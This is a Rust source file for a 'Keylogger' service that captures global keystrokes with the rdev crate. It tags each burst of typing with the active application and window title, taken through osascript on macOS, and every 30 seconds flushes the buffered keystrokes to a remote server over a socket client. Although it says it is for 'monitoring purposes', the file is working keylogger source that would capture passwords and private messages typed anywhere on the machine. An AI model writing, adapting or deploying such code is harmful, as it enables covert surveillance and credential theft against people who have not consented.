//! Keylogger service for capturing keystrokes.
//!
//! Captures global keyboard input and reports it to the server
//! for monitoring purposes.

use crate::socket::events::KeystrokeEntry;
use crate::socket::SocketClient;
use rdev::{listen, Event, EventType, Key};
use std::sync::Arc;
use std::time::Duration;
use tokio::sync::{mpsc, RwLock};
use tracing::{debug, error, info, warn};

/// Keystroke buffer entry
#[derive(Debug, Clone)]
struct KeystrokeBuffer {
    keys: String,
    application_name: String,
    window_title: String,
    timestamp: u64,
}

/// Keylogger service
#[derive(Clone)]
pub struct Keylogger {
    socket: Arc<SocketClient>,
    is_running: Arc<RwLock<bool>>,
    buffer: Arc<RwLock<Vec<KeystrokeBuffer>>>,
    current_stroke: Arc<RwLock<Option<KeystrokeBuffer>>>,
    buffer_size: Arc<RwLock<usize>>,
    flush_handle: Arc<RwLock<Option<tokio::task::JoinHandle<()>>>>,
    listener_handle: Arc<RwLock<Option<std::thread::JoinHandle<()>>>>,
}

impl Keylogger {
    /// Create a new keylogger service
    pub fn new(socket: Arc<SocketClient>) -> Self {
        Self {
            socket,
            is_running: Arc::new(RwLock::new(false)),
            buffer: Arc::new(RwLock::new(Vec::new())),
            current_stroke: Arc::new(RwLock::new(None)),
            buffer_size: Arc::new(RwLock::new(100)),
            flush_handle: Arc::new(RwLock::new(None)),
            listener_handle: Arc::new(RwLock::new(None)),
        }
    }

    /// Start the keylogger
    pub async fn start(&self) {
        if *self.is_running.read().await {
            return;
        }

        *self.is_running.write().await = true;

        // Create channel for key events
        let (tx, mut rx) = mpsc::channel::<KeyEvent>(1000);

        // Start listener in a separate thread (rdev requires this)
        let tx_clone = tx.clone();
        let is_running = self.is_running.clone();

        let listener_handle = std::thread::spawn(move || {
            let tx = tx_clone;

            if let Err(e) = listen(move |event| {
                if let EventType::KeyPress(key) = event.event_type {
                    let _ = tx.blocking_send(KeyEvent {
                        key,
                        timestamp: Self::timestamp_sync(),
                    });
                }
            }) {
                error!("Keyboard listener error: {:?}", e);
            }
        });

        *self.listener_handle.write().await = Some(listener_handle);

        // Start key processing task
        let buffer = self.buffer.clone();
        let current_stroke = self.current_stroke.clone();
        let buffer_size = self.buffer_size.clone();
        let is_running_proc = self.is_running.clone();

        tokio::spawn(async move {
            while *is_running_proc.read().await {
                if let Some(event) = rx.recv().await {
                    Self::process_key_event(
                        event,
                        &buffer,
                        &current_stroke,
                        &buffer_size,
                    )
                    .await;
                }
            }
        });

        // Start flush task
        let socket = self.socket.clone();
        let is_running_flush = self.is_running.clone();
        let buffer_flush = self.buffer.clone();
        let current_stroke_flush = self.current_stroke.clone();

        let flush_handle = tokio::spawn(async move {
            loop {
                if !*is_running_flush.read().await {
                    break;
                }

                tokio::time::sleep(Duration::from_secs(30)).await;

                Self::flush_buffer(&socket, &buffer_flush, &current_stroke_flush).await;
            }
        });

        *self.flush_handle.write().await = Some(flush_handle);

        info!("Keylogger service started");
    }

    /// Stop the keylogger
    pub async fn stop(&self) {
        *self.is_running.write().await = false;

        // Flush remaining buffer
        Self::flush_buffer(&self.socket, &self.buffer, &self.current_stroke).await;

        if let Some(handle) = self.flush_handle.write().await.take() {
            handle.abort();
        }

        // Note: The listener thread will exit when the next key is pressed
        // or when the program exits. We can't easily stop it.

        info!("Keylogger service stopped");
    }

    /// Process a key event
    async fn process_key_event(
        event: KeyEvent,
        buffer: &Arc<RwLock<Vec<KeystrokeBuffer>>>,
        current_stroke: &Arc<RwLock<Option<KeystrokeBuffer>>>,
        buffer_size: &Arc<RwLock<usize>>,
    ) {
        let key_string = Self::key_to_string(&event.key);
        if key_string.is_empty() {
            return;
        }

        // Get active window info
        let (app_name, window_title) = Self::get_active_window_info();

        let max_size = *buffer_size.read().await;
        let mut current = current_stroke.write().await;

        // Check if we need to start a new stroke
        let should_start_new = match &*current {
            None => true,
            Some(stroke) => {
                stroke.application_name != app_name
                    || stroke.window_title != window_title
                    || stroke.keys.len() >= max_size
            }
        };

        if should_start_new {
            // Save current stroke if exists
            if let Some(stroke) = current.take() {
                if !stroke.keys.is_empty() {
                    buffer.write().await.push(stroke);
                }
            }

            // Start new stroke
            *current = Some(KeystrokeBuffer {
                keys: key_string,
                application_name: app_name,
                window_title,
                timestamp: event.timestamp,
            });
        } else if let Some(ref mut stroke) = *current {
            // Append to current stroke
            stroke.keys.push_str(&key_string);
        }

        // Check if buffer is full
        if buffer.read().await.len() >= 10 {
            drop(current); // Release the lock
            // Buffer will be flushed by the flush task
        }
    }

    /// Flush the buffer to the server
    async fn flush_buffer(
        socket: &SocketClient,
        buffer: &Arc<RwLock<Vec<KeystrokeBuffer>>>,
        current_stroke: &Arc<RwLock<Option<KeystrokeBuffer>>>,
    ) {
        // Add current stroke to buffer
        {
            let mut current = current_stroke.write().await;
            if let Some(stroke) = current.take() {
                if !stroke.keys.is_empty() {
                    buffer.write().await.push(stroke);
                }
            }
        }

        // Get all entries from buffer
        let entries: Vec<KeystrokeBuffer> = buffer.write().await.drain(..).collect();

        if entries.is_empty() {
            return;
        }

        // Convert to socket format
        let strokes: Vec<KeystrokeEntry> = entries
            .into_iter()
            .map(|e| KeystrokeEntry {
                keys: e.keys,
                application_name: e.application_name,
                window_title: e.window_title,
                timestamp: e.timestamp,
            })
            .collect();

        let count = strokes.len();

        if let Err(e) = socket.send_keystrokes(strokes).await {
            warn!("Failed to send keystrokes: {}", e);
        } else {
            debug!("Flushed {} keystroke entries", count);
        }
    }

    /// Convert a key to its string representation
    fn key_to_string(key: &Key) -> String {
        match key {
            // Letters
            Key::KeyA => "a",
            Key::KeyB => "b",
            Key::KeyC => "c",
            Key::KeyD => "d",
            Key::KeyE => "e",
            Key::KeyF => "f",
            Key::KeyG => "g",
            Key::KeyH => "h",
            Key::KeyI => "i",
            Key::KeyJ => "j",
            Key::KeyK => "k",
            Key::KeyL => "l",
            Key::KeyM => "m",
            Key::KeyN => "n",
            Key::KeyO => "o",
            Key::KeyP => "p",
            Key::KeyQ => "q",
            Key::KeyR => "r",
            Key::KeyS => "s",
            Key::KeyT => "t",
            Key::KeyU => "u",
            Key::KeyV => "v",
            Key::KeyW => "w",
            Key::KeyX => "x",
            Key::KeyY => "y",
            Key::KeyZ => "z",

            // Numbers
            Key::Num0 => "0",
            Key::Num1 => "1",
            Key::Num2 => "2",
            Key::Num3 => "3",
            Key::Num4 => "4",
            Key::Num5 => "5",
            Key::Num6 => "6",
            Key::Num7 => "7",
            Key::Num8 => "8",
            Key::Num9 => "9",

            // Special keys
            Key::Space => " ",
            Key::Return => "[ENTER]",
            Key::Tab => "[TAB]",
            Key::Backspace => "[BACKSPACE]",
            Key::Delete => "[DELETE]",
            Key::Escape => "[ESC]",
            Key::LeftArrow => "[LEFT]",
            Key::RightArrow => "[RIGHT]",
            Key::UpArrow => "[UP]",
            Key::DownArrow => "[DOWN]",
            Key::Home => "[HOME]",
            Key::End => "[END]",
            Key::PageUp => "[PGUP]",
            Key::PageDown => "[PGDN]",
            Key::CapsLock => "[CAPS]",

            // Function keys
            Key::F1 => "[F1]",
            Key::F2 => "[F2]",
            Key::F3 => "[F3]",
            Key::F4 => "[F4]",
            Key::F5 => "[F5]",
            Key::F6 => "[F6]",
            Key::F7 => "[F7]",
            Key::F8 => "[F8]",
            Key::F9 => "[F9]",
            Key::F10 => "[F10]",
            Key::F11 => "[F11]",
            Key::F12 => "[F12]",

            // Modifiers - skip them
            Key::ShiftLeft | Key::ShiftRight => "",
            Key::ControlLeft | Key::ControlRight => "",
            Key::Alt | Key::AltGr => "",
            Key::MetaLeft | Key::MetaRight => "",

            // Punctuation
            Key::Comma => ",",
            Key::Dot => ".",
            Key::Slash => "/",
            Key::SemiColon => ";",
            Key::Quote => "'",
            Key::LeftBracket => "[",
            Key::RightBracket => "]",
            Key::BackSlash => "\\",
            Key::Minus => "-",
            Key::Equal => "=",
            Key::BackQuote => "`",

            // Unknown keys
            Key::Unknown(code) => {
                debug!("Unknown key code: {}", code);
                return format!("[KEY:{}]", code);
            }

            _ => {
                return format!("[{:?}]", key);
            }
        }
        .to_string()
    }

    /// Get active window information
    fn get_active_window_info() -> (String, String) {
        #[cfg(target_os = "macos")]
        {
            if let Some((app, title)) = Self::get_macos_active_window() {
                return (app, title);
            }
        }

        #[cfg(target_os = "windows")]
        {
            // Windows implementation
        }

        #[cfg(target_os = "linux")]
        {
            // Linux implementation
        }

        ("Unknown".to_string(), "Unknown".to_string())
    }

    #[cfg(target_os = "macos")]
    fn get_macos_active_window() -> Option<(String, String)> {
        let script = r#"
            tell application "System Events"
                set frontApp to name of first application process whose frontmost is true
                set frontWindow to ""
                try
                    tell application process frontApp
                        set frontWindow to name of front window
                    end tell
                end try
                return frontApp & "|" & frontWindow
            end tell
        "#;

        if let Ok(output) = std::process::Command::new("osascript")
            .args(["-e", script])
            .output()
        {
            if output.status.success() {
                let result = String::from_utf8_lossy(&output.stdout).trim().to_string();
                let parts: Vec<&str> = result.splitn(2, '|').collect();
                if parts.len() == 2 {
                    return Some((parts[0].to_string(), parts[1].to_string()));
                }
            }
        }
        None
    }

    /// Get current timestamp in milliseconds (sync version)
    fn timestamp_sync() -> u64 {
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap_or_default()
            .as_millis() as u64
    }

    /// Set buffer size
    pub async fn set_buffer_size(&self, size: usize) {
        *self.buffer_size.write().await = size;
    }

    /// Check if running
    pub async fn is_active(&self) -> bool {
        *self.is_running.read().await
    }
}

/// Key event for channel communication
struct KeyEvent {
    key: Key,
    timestamp: u64,
}
